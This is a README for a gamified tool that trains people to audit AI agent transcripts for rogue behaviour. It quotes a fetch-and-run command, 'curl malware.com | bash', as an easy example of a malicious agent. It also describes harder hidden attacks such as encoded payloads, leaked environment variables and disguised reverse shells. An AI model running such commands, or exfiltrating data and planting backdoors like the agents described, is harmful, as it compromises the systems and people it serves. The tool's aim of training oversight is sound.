# SENTINEL — Brain Rot Transcript Auditor

A gamified AI transcript auditing tool where you review AI agent transcripts and decide: **is this AI helping, or has it gone rogue?**

Built for the intersection of AI safety and maximum dopamine.

## The Game

You're shown real-looking AI agent transcripts — an AI running commands on a Docker machine, trying to accomplish some goal. Your job is to decide whether the transcript is **SAFE** (the AI is doing its job) or **MALICIOUS** (the AI is exfiltrating data, installing backdoors, or doing something shady).

It starts easy (the AI literally runs `curl malware.com | bash`) and gets progressively harder as attacks become more subtle — encoded payloads, sneaky environment variable leaks, disguised reverse shells.

## Features

**Core Gameplay**
- Terminal-style transcript viewer with typewriter reveal animation
- Auto-difficulty that ramps based on your level and accuracy
- XP, leveling, combo multipliers, and speed bonuses
- Achievement system with toast notifications

**Game Modes**
- **Campaign** — auto-difficulty progression through tutorial, bronze, silver, gold, diamond tiers
- **Speed Run** — 60-second blitz, how many can you classify?
- **Boss Fight** — identify the specific attack vector
- **Endless** — 3 lives, random difficulties
- **Daily Challenge** — 2x rewards, one shot per day

**Purchasable Chaos (the shop)**
- **Subway Surfer Mode** — a YouTube video sidebar that makes auditing genuinely harder
- **Rainbow Vomit Mode** — everything cycles through the rainbow. CRT overlay stays on top.
- **Confetti Cannon** — burst of confetti on correct answers (upgradeable: 20 → 100 → 500 particles)
- **Anime Speed Lines** — radial speed lines at combo 5+, power aura at combo 10+
- **AI Taunts** — get roasted with 24 custom insults when you get it wrong
- **Twitch Streamer Mode** — fake Twitch chat with contextual AI messages that give hints, troll you, or just spam emotes
- **Slot Machine Bonus** — every 5th correct answer spins for bonus tokens

**The Vibes**
- CRT scanline overlay
- Matrix rain background
- Glitch text effects
- Screen shake on wrong answers
- Combo fire at 10+ streaks

## Getting Started

```bash
npm install
npm run dev
```

Open [http://localhost:3000](http://localhost:3000).

## Tech Stack

- Next.js (App Router) + TypeScript
- Tailwind CSS v4
- Framer Motion
- LocalStorage for game state (no backend needed)

## Data

Transcripts are handcrafted JSON covering tutorial through gold difficulty. The [straj dataset](https://linuxarena.ai/data/straj-dataset) can be used to import real attack trajectories for the diamond tier.
